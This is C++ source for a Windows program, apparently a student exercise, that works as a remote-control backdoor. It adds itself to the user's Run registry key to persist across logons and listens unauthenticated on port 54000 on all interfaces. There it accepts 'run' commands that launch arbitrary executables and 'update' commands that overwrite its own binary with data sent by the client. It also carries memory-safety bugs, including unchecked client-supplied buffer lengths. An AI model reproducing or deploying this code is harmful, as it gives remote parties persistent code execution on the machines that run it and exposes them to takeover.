#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define CAT_SECURE_NO_WARNINGS
#include <iostream>
#include <WS2tcpip.h>
#include <WinSock2.h>
#include<stdio.h>
#include<windows.h>
#include <string>

#pragma comment (lib, "ws2_32.lib")



//////////////////////////////////////////////////////////////////////////
#define version "0.0.1"            //////////////////////////////////////
/////////////////////////////////////////////////////////////////////////




/*

 _     _ _
(_) __| | |__  _ __ ___
| |/ _` | '_ \| '_ ` _ \
| | (_| | | | | | | | | | ©
|_|\__,_|_| |_|_| |_| |_|




*/
using namespace std;

//©idan doron hai maman -IDHM©
enum names { RUN, PONG, SAVE, VERSION, UPDATE, ELSE };
int   maps(char* a)// maps code words to int(enum) for the switch case ... 
{
	//works with upper or lower letters 
	if (strlen(a) < 3)
		return ELSE;
	if (!strcmp(a, "run") || !strcmp(a, "RUN"))
		return RUN;
	if (!strcmp(a, "ping") || !strcmp(a, "PING"))
		return PONG;
	if (!strcmp(a, "version") || !strcmp(a, "VERSION"))
		return VERSION;
	if (!strcmp(a, "update") || !strcmp(a, "UPDATE"))
		return UPDATE;
	return ELSE;
}
char host[NI_MAXHOST];

INT counting(const char a[])//like strlen+1 ... but i wanted to do that on my own .... 
{
	INT c = 0;
	for (int i = 0; a[i] != '\0'; i++)
	{
		c++;
	}
	return c + 1;
}

int  getwrite(SOCKET& Csock, char* buf)//get massage of 256 BYTES - CHARS with errors and echo verfiy 
{
	int byterecv = recv(Csock, buf, 256, 0);
	if (byterecv == SOCKET_ERROR)
	{
		cerr << "recv is broken \n error number :2 " << endl;
		return 1;
	}

	if (byterecv == 0)
	{
		cout << "disconnection \n error number  :2  " << endl;
		return  1;
	}
	//send echo massatge for verfiy - bonus ++ ( i know that tcp is doing that but this is protect from hackers or something like that - i just thought this will be cool ) 
	buf[byterecv - 1] = '\0';
	cout << buf << endl;

	send(Csock, buf, 256, 0);

	return 2;
}
void sendwrite(SOCKET& sock, char userInput[])//like get write but with send...
{
	char buf[256];
	int sendResult = send(sock, userInput, 256, 0);
	if (sendResult != SOCKET_ERROR)
	{

		ZeroMemory(buf, 256);
		int byterecv = recv(sock, buf, 256, 0);
		if (byterecv > 0)
		{

			cout << "CLIENRT > " << string(buf, 0, byterecv) << endl;
		}
		if (strcmp(userInput, buf))//verify  echo massage - to be sure that there is no mistake ( i know that tcp is doing that but this is protect from hackers or something like that - i just thought this will be cool ) 
		{
			printf("yuston we have a problem.... :(");
		}
	}

}

int main()
{
	printf("\n\nall of the written data is for control - help to the checker to see that i did the work properly\n\n "); 
	char namepath[256];
	GetModuleFileNameA(NULL, namepath, 256);// get the program path 
	cout << "path:" << namepath << endl;
	cout << " version:   " << version << endl; // the current version 
	HANDLE protection = CreateMutexA(NULL, TRUE, "protect");//mutex to verfiy that the program open only once 
	DWORD check = WaitForSingleObject(protection, 0);
	if (check != WAIT_OBJECT_0)
	{
		printf("only one run at a time , plz close the other program that runs \n error number:  1 ");
		return 1;
	}

	// open the registry folder then create new file and write the path and then close the registry
	HKEY hkey;
	RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hkey);
	RegSetValueExA(hkey, "IDHMPROGRAMOS", 0, REG_SZ, (BYTE*)namepath, 255 * sizeof(char));
	RegCloseKey(hkey);














	// add some dlls nothing important 
	WSADATA wsData;
	WORD ver = MAKEWORD(2, 2);// version 2.2 of WSADATA 

	int wsOk = WSAStartup(ver, &wsData);
	if (wsOk != 0)
	{
		cerr << "cant create WSADATA -> needs repair \n error number:2 " << endl;
		return 1;
	}


	SOCKET listening = socket(AF_INET, SOCK_STREAM, 0);// create the socket 
	if (listening == INVALID_SOCKET)
	{
		cerr << "can not create socket-> needs repair \n error number :2 " << endl;
		return 1;
	}


	sockaddr_in hint;
	hint.sin_family = AF_INET;
	hint.sin_port = htons(54000);
	hint.sin_addr.s_addr = inet_addr("0.0.0.0");//accept all -we are able to cahnge it for sequrity purpuses 



	bind(listening, (sockaddr*)&hint, sizeof(hint));// gives listen value

	printf("code is freezing right now ...(because of listen command) -> wait to client connact until that it will still be freezed  ");
	listen(listening, SOMAXCONN);// freeze the code and wait for the client to send massage ,waits in port 54000 not one of the well knowns ports 


	sockaddr_in client;
	int Csize  = sizeof(client);

	SOCKET Csock = accept(listening, (sockaddr*)&client, &Csize );// gets the clients data 


	char service[NI_MAXSERV];

	ZeroMemory(host, NI_MAXHOST); // reset array to zeros it is not a  must but this is nice 
	ZeroMemory(service, NI_MAXSERV);// reset array to zeros it is not a  must but this is nice 

	if (getnameinfo((sockaddr*)&client, sizeof(client), host, NI_MAXHOST, service, NI_MAXSERV, 0) == 0)//prints clients info 
	{
		char host[100];
		inet_ntop(AF_INET, &(hint.sin_addr), host, INET_ADDRSTRLEN);
		// :: before var is global , i called them on the same name because they present the same thing in certian way ( the name and the ip are close to each other )  
		cout << "name : " << ::host << endl << "  ip: " << host << endl << "  connected on port " << service << endl;
	}
	else
	{
		//cliets info is unkown... 
		inet_ntop(AF_INET, &client.sin_addr, host, NI_MAXHOST);
		cout << host << " connected on port " <<
			ntohs(client.sin_port) << endl;
	}

	closesocket(listening);//close the socket that was for listening  


	char buf[256];
	do
	{
		ZeroMemory(buf, 256);// reset array to zeros it is not must but this is nice 
		if (getwrite(Csock, buf) == 1) return 1;//close the program if there is any error 
		// becaãse we did zero all the data is now zeros .


		switch (maps(buf))
		{
		case RUN://open program 
		{
			// this peace if code has taken from Barak's book ... 
			CHAR EXE_FILENAME1[256];

			if (getwrite(Csock, EXE_FILENAME1) == 1) {				closesocket(Csock);

			// Cleanup winsock
			WSACleanup();  ReleaseMutex(protection); return 1;
		}
			STARTUPINFOA si;
			PROCESS_INFORMATION pi;

			ZeroMemory(&si, sizeof(si));
			si.cb = sizeof(si);
			ZeroMemory(&pi, sizeof(pi));
			// create argument string

			;
			INT size = counting(EXE_FILENAME1) + 4 + 2;

			PCHAR param = (PCHAR)malloc(size * sizeof(CHAR));

			sprintf_s(param, size, "%s ", EXE_FILENAME1);
			// Start the child process.
			CreateProcessA(NULL,
				param, // Command line
				NULL, // Process handle not inheritable
				NULL, // Thread handle not inheritable
				FALSE, // Set handle inheritance to FALSE
				0, // No creation flags
				NULL, // Use parent's environment block
				NULL, // Use parent's starting directory
				&si, // Pointer to STARTUPINFO structure
				&pi); // Pointer to PROCESS_INFORMATION structure
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);
			free(param);
		}
		break;
		case PONG:
		{
			char ping[] = "pong";// send the word pong in secured way 
			sendwrite(Csock, ping);


		}
		break;
		case VERSION:
		{
			char ver[] = version;// send the version in secured way
			sendwrite(Csock, ver);
		}
		break;
		case UPDATE:
		{
			char buff[256];
			char* buffer;
			if (getwrite(Csock, buff) == 1) {
				closesocket(Csock);
				// Cleanup winsock
				WSACleanup();  
				ReleaseMutex(protection);
		 return 1;
			}// get the size of the file to 256 bit arry -> huge size 10^256 is the max size no one cant reach that size in this decide 
			long long int len = atoi(buff);

			buffer = (char*)malloc(sizeof(CHAR) * len);
			int byterecv = recv(Csock, buffer, len, 0);




			if (byterecv == SOCKET_ERROR)
			{
				cerr << "Error in recv(). Quitting" << endl;
				return 1;
			}

			if (byterecv == 0)
			{
				cout << "Client disconnected " << endl;
				return  2;
			}
			for (int i = 0; i < len; i++)//prints all the data (i didnt used normal printing beacuse all the \0) 
			{
				cout << buffer[i];
			}




			DeleteFileA("temppry.exe");// delete  the last version 
			rename(namepath, "temppry.exe");// saves the current one 
			// replace it in the new one 
			HANDLE file = CreateFileA(namepath, GENERIC_WRITE, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			cout << WriteFile(file, buffer, len, NULL, NULL);
			CloseHandle(file);
			free(buffer);
			printf("restart the sever plz");
			//close all the stuff 
			closesocket(Csock);
			// Cleanup winsock
			WSACleanup();
			ReleaseMutex(protection);
			return 1;


		}
		break;


		}

	} while (true);
	//close all the stuff 
	closesocket(Csock);

	// Cleanup winsock
	WSACleanup();

	ReleaseMutex(protection);



}

















